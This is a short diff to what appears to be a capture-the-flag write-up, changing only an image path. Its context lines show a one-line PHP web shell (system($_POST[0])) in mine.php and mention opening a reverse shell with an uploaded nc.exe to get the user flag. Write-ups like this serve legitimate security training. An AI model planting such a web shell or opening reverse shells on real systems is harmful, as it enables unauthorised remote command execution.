@@ -99,7 +99,7 @@ $ cat mine.php
 system($_POST[0]);
 ?>
 ```
-![Commande execution](img/rce.png "Commande execution")
+![Commande execution](../img/rce.png "Commande execution")
 
 We established a reverse shell with `nc.exe`(previously uploaded) and then we grabbed the user flag:
 
